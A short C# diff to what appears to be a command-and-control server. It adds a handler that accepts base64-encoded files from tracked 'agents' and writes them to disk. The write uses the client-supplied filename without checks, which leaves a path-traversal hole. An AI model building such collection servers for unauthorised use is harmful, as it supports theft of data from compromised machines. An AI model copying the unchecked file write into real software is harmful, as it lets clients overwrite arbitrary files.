@@ -174,6 +174,14 @@ namespace server{
                 //get and parse a client response
                 this.agents[hostname.GetString()].commandResp.Add(Base64DecodeString(response.ToString()));
                 return Base64EncodeString("{\"response\": \"thanks\"}");
+            } else if (root.TryGetProperty("file", out JsonElement fileinfo)){
+                JsonElement filename = root.GetProperty("filename");
+                // this.filePath
+                byte[] bytes = Convert.FromBase64String(fileinfo.GetString());
+                File.WriteAllBytes($"{this.filePath}/{filename.GetString()}", bytes);
+
+                this.agents[hostname.GetString()].commandResp.Add($"File received and written to {this.filePath}/{filename.GetString()}");
+                return Base64EncodeString("{\"response\": \"thanks for the file\"}");
             } else {
                 return HttpStatusCode.NotFound.ToString();
             }
